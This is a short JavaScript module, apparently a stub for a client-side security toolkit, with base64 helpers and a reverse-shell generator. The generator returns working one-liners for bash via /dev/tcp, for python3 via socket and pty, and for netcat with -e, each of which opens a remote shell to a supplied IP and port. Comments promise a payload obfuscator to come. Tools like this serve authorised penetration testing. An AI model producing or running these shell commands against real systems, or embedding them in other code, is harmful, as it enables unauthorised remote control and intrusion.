// Client-side tool utilities (no server execution). Scaffold stub with a couple of
// working starters; the full set (encoders, hash/hex, obfuscator, etc.) is added in the build.

export function b64encode(s){ return btoa(unescape(encodeURIComponent(s))); }
export function b64decode(s){ try { return decodeURIComponent(escape(atob(s))); } catch { return "(invalid base64)"; } }

// Reverse-shell one-liner generator (starter - more languages added in the build).
export function reverseShell(lang, ip, port){
  const p = String(port);
  switch (lang) {
    case "bash":    return `bash -i >& /dev/tcp/${ip}/${p} 0>&1`;
    case "python3": return `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${p}));[os.dup2(s.fileno(),f) for f in(0,1,2)];import pty;pty.spawn("/bin/sh")'`;
    case "nc":      return `nc -e /bin/sh ${ip} ${p}`;
    default:        return "";
  }
}

// TODO(build): hashing, hex/url encoders, payload obfuscator, JWT decoder, etc.
